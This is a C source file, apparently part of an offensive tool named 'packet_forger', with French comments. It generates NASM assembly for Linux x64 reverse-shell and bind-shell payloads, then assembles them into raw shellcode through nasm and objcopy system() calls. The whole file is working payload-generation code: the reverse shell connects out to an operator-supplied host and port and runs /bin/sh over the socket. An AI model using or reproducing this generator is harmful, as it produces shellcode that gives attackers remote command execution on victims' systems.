#include "../include/payload_generator.h"
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

/**
 * Génère du code assembleur NASM pour un reverse shell Linux x64
 * @param lhost: IP du listener
 * @param lport: Port du listener
 * @param output_file: Fichier de sortie pour l'assembleur
 * @return: 0 si succès, -1 si erreur
 */
int generate_asm_reverse_shell_linux(const char *lhost, int lport, const char *output_file) {
    FILE *fp;
    unsigned int ip_bytes[4];
    unsigned short port_hi, port_lo;
    
    // Parser l'IP
    if (sscanf(lhost, "%u.%u.%u.%u", &ip_bytes[0], &ip_bytes[1], &ip_bytes[2], &ip_bytes[3]) != 4) {
        return -1;
    }
    
    // Calculer les bytes du port (network byte order)
    port_hi = (lport >> 8) & 0xFF;
    port_lo = lport & 0xFF;
    
    fp = fopen(output_file, "w");
    if (!fp) {
        return -1;
    }
    
    fprintf(fp, "; Reverse Shell Linux x64 - Généré automatiquement\n");
    fprintf(fp, "; IP: %s, Port: %d\n", lhost, lport);
    fprintf(fp, "BITS 64\n");
    fprintf(fp, "\n");
    fprintf(fp, "section .text\n");
    fprintf(fp, "global _start\n");
    fprintf(fp, "\n");
    fprintf(fp, "_start:\n");
    fprintf(fp, "    ; socket(AF_INET, SOCK_STREAM, 0)\n");
    fprintf(fp, "    xor rax, rax\n");
    fprintf(fp, "    xor rdi, rdi\n");
    fprintf(fp, "    xor rsi, rsi\n");
    fprintf(fp, "    xor rdx, rdx\n");
    fprintf(fp, "    push 2\n");
    fprintf(fp, "    pop rdi\n");
    fprintf(fp, "    push 1\n");
    fprintf(fp, "    pop rsi\n");
    fprintf(fp, "    push 6\n");
    fprintf(fp, "    pop rdx\n");
    fprintf(fp, "    push 41\n");
    fprintf(fp, "    pop rax\n");
    fprintf(fp, "    syscall\n");
    fprintf(fp, "    mov rdi, rax\n");
    fprintf(fp, "\n");
    fprintf(fp, "    ; connect(sockfd, &sockaddr, 16)\n");
    fprintf(fp, "    xor rax, rax\n");
    fprintf(fp, "    push rax\n");
    fprintf(fp, "    mov byte [rsp], 2\n");
    fprintf(fp, "    mov word [rsp+2], 0x%02x%02x\n", port_hi, port_lo);
    fprintf(fp, "    mov dword [rsp+4], 0x%02x%02x%02x%02x\n", 
            ip_bytes[0], ip_bytes[1], ip_bytes[2], ip_bytes[3]);
    fprintf(fp, "    mov rsi, rsp\n");
    fprintf(fp, "    push 16\n");
    fprintf(fp, "    pop rdx\n");
    fprintf(fp, "    push 42\n");
    fprintf(fp, "    pop rax\n");
    fprintf(fp, "    syscall\n");
    fprintf(fp, "\n");
    fprintf(fp, "    ; dup2(clientfd, 0/1/2)\n");
    fprintf(fp, "    xor rsi, rsi\n");
    fprintf(fp, "    push 3\n");
    fprintf(fp, "    pop rsi\n");
    fprintf(fp, "dup_loop:\n");
    fprintf(fp, "    dec rsi\n");
    fprintf(fp, "    push 33\n");
    fprintf(fp, "    pop rax\n");
    fprintf(fp, "    syscall\n");
    fprintf(fp, "    jnz dup_loop\n");
    fprintf(fp, "\n");
    fprintf(fp, "    ; execve(\"/bin/sh\", [\"/bin/sh\", NULL], NULL)\n");
    fprintf(fp, "    xor rax, rax\n");
    fprintf(fp, "    push rax\n");
    fprintf(fp, "    mov rbx, 0x68732f6e69622f2f\n");
    fprintf(fp, "    push rbx\n");
    fprintf(fp, "    mov rdi, rsp\n");
    fprintf(fp, "    push rax\n");
    fprintf(fp, "    push rdi\n");
    fprintf(fp, "    mov rsi, rsp\n");
    fprintf(fp, "    xor rdx, rdx\n");
    fprintf(fp, "    push 59\n");
    fprintf(fp, "    pop rax\n");
    fprintf(fp, "    syscall\n");
    
    fclose(fp);
    return 0;
}

/**
 * Génère du code assembleur NASM pour un bind shell Linux x64
 * @param lport: Port d'écoute
 * @param output_file: Fichier de sortie pour l'assembleur
 * @return: 0 si succès, -1 si erreur
 */
int generate_asm_bind_shell_linux(int lport, const char *output_file) {
    FILE *fp;
    unsigned short port_hi, port_lo;
    
    port_hi = (lport >> 8) & 0xFF;
    port_lo = lport & 0xFF;
    
    fp = fopen(output_file, "w");
    if (!fp) {
        return -1;
    }
    
    fprintf(fp, "; Bind Shell Linux x64 - Généré automatiquement\n");
    fprintf(fp, "; Port: %d\n", lport);
    fprintf(fp, "BITS 64\n");
    fprintf(fp, "\n");
    fprintf(fp, "section .text\n");
    fprintf(fp, "global _start\n");
    fprintf(fp, "\n");
    fprintf(fp, "_start:\n");
    fprintf(fp, "    ; socket(AF_INET, SOCK_STREAM, 0)\n");
    fprintf(fp, "    xor rax, rax\n");
    fprintf(fp, "    xor rdi, rdi\n");
    fprintf(fp, "    xor rsi, rsi\n");
    fprintf(fp, "    xor rdx, rdx\n");
    fprintf(fp, "    push 2\n");
    fprintf(fp, "    pop rdi\n");
    fprintf(fp, "    push 1\n");
    fprintf(fp, "    pop rsi\n");
    fprintf(fp, "    push 6\n");
    fprintf(fp, "    pop rdx\n");
    fprintf(fp, "    push 41\n");
    fprintf(fp, "    pop rax\n");
    fprintf(fp, "    syscall\n");
    fprintf(fp, "    mov rdi, rax\n");
    fprintf(fp, "\n");
    fprintf(fp, "    ; bind(sockfd, &sockaddr, 16)\n");
    fprintf(fp, "    xor rax, rax\n");
    fprintf(fp, "    push rax\n");
    fprintf(fp, "    mov byte [rsp], 2\n");
    fprintf(fp, "    mov word [rsp+2], 0x%02x%02x\n", port_hi, port_lo);
    fprintf(fp, "    mov dword [rsp+4], 0\n");
    fprintf(fp, "    mov rsi, rsp\n");
    fprintf(fp, "    push 16\n");
    fprintf(fp, "    pop rdx\n");
    fprintf(fp, "    push 49\n");
    fprintf(fp, "    pop rax\n");
    fprintf(fp, "    syscall\n");
    fprintf(fp, "\n");
    fprintf(fp, "    ; listen(sockfd, 0)\n");
    fprintf(fp, "    xor rsi, rsi\n");
    fprintf(fp, "    push 50\n");
    fprintf(fp, "    pop rax\n");
    fprintf(fp, "    syscall\n");
    fprintf(fp, "\n");
    fprintf(fp, "    ; accept(sockfd, NULL, NULL)\n");
    fprintf(fp, "    xor rsi, rsi\n");
    fprintf(fp, "    xor rdx, rdx\n");
    fprintf(fp, "    push 43\n");
    fprintf(fp, "    pop rax\n");
    fprintf(fp, "    syscall\n");
    fprintf(fp, "    mov rdi, rax\n");
    fprintf(fp, "\n");
    fprintf(fp, "    ; dup2(clientfd, 0/1/2)\n");
    fprintf(fp, "    xor rsi, rsi\n");
    fprintf(fp, "    push 3\n");
    fprintf(fp, "    pop rsi\n");
    fprintf(fp, "dup_loop:\n");
    fprintf(fp, "    dec rsi\n");
    fprintf(fp, "    push 33\n");
    fprintf(fp, "    pop rax\n");
    fprintf(fp, "    syscall\n");
    fprintf(fp, "    jnz dup_loop\n");
    fprintf(fp, "\n");
    fprintf(fp, "    ; execve(\"/bin/sh\", [\"/bin/sh\", NULL], NULL)\n");
    fprintf(fp, "    xor rax, rax\n");
    fprintf(fp, "    push rax\n");
    fprintf(fp, "    mov rbx, 0x68732f6e69622f2f\n");
    fprintf(fp, "    push rbx\n");
    fprintf(fp, "    mov rdi, rsp\n");
    fprintf(fp, "    push rax\n");
    fprintf(fp, "    push rdi\n");
    fprintf(fp, "    mov rsi, rsp\n");
    fprintf(fp, "    xor rdx, rdx\n");
    fprintf(fp, "    push 59\n");
    fprintf(fp, "    pop rax\n");
    fprintf(fp, "    syscall\n");
    
    fclose(fp);
    return 0;
}

/**
 * Génère du code assembleur MASM pour un reverse shell Windows x64
 * @param lhost: IP du listener
 * @param lport: Port du listener
 * @param output_file: Fichier de sortie pour l'assembleur
 * @return: 0 si succès, -1 si erreur
 */
int generate_asm_reverse_shell_windows(const char *lhost, int lport, const char *output_file) {
    // Utiliser la nouvelle fonction complète avec résolution dynamique
    return generate_windows_asm_reverse_shell_complete(lhost, lport, output_file);
}

/**
 * Assemble le fichier NASM et extrait le shellcode binaire
 * @param asm_file: Fichier assembleur source
 * @param shellcode: Buffer de sortie pour le shellcode
 * @param shellcode_size: Taille du buffer
 * @return: Taille du shellcode, ou -1 si erreur
 */
int assemble_nasm_shellcode(const char *asm_file, unsigned char *shellcode, int shellcode_size) {
    char cmd[512];
    char obj_file[256];
    char bin_file[256];
    FILE *fp;
    int len;
    
    // Générer les noms de fichiers
    snprintf(obj_file, sizeof(obj_file), "%s.o", asm_file);
    snprintf(bin_file, sizeof(bin_file), "%s.bin", asm_file);
    
    // Assembler avec NASM
    snprintf(cmd, sizeof(cmd), "nasm -f elf64 -w-number-overflow %s -o %s 2>&1", asm_file, obj_file);
    if (system(cmd) != 0) {
        return -1;
    }
    
    // Extraire le code avec objcopy
    snprintf(cmd, sizeof(cmd), "objcopy -O binary -j .text %s %s 2>&1", obj_file, bin_file);
    if (system(cmd) != 0) {
        // Essayer avec objdump si objcopy n'est pas disponible
        snprintf(cmd, sizeof(cmd), "objdump -d %s | grep -o '[0-9a-f]\\{2\\}' | xxd -r -p > %s 2>&1", obj_file, bin_file);
        if (system(cmd) != 0) {
            return -1;
        }
    }
    
    // Lire le fichier binaire
    fp = fopen(bin_file, "rb");
    if (!fp) {
        return -1;
    }
    
    len = fread(shellcode, 1, shellcode_size, fp);
    fclose(fp);
    
    // Nettoyer les fichiers temporaires
    unlink(obj_file);
    unlink(bin_file);
    
    return len;
}

/**
 * Génère et assemble un shellcode en assembleur pur
 * @param lhost: IP du listener
 * @param lport: Port du listener
 * @param platform: "linux" ou "windows"
 * @param shellcode: Buffer de sortie
 * @param shellcode_size: Taille du buffer
 * @return: Taille du shellcode, ou -1 si erreur
 */
int generate_and_assemble_shellcode(const char *lhost, int lport, const char *platform,
                                    unsigned char *shellcode, int shellcode_size) {
    char asm_file[256];
    int ret;
    
    // Créer un nom de fichier temporaire
    snprintf(asm_file, sizeof(asm_file), "/tmp/packet_forger_shellcode_%d.asm", getpid());
    
    // Générer le fichier assembleur
    if (strcmp(platform, "linux") == 0) {
        ret = generate_asm_reverse_shell_linux(lhost, lport, asm_file);
    } else if (strcmp(platform, "windows") == 0) {
        ret = generate_asm_reverse_shell_windows(lhost, lport, asm_file);
    } else {
        return -1;
    }
    
    if (ret < 0) {
        unlink(asm_file);
        return -1;
    }
    
    // Assembler et extraire le shellcode
    ret = assemble_nasm_shellcode(asm_file, shellcode, shellcode_size);
    
    // Nettoyer
    unlink(asm_file);
    
    return ret;
}

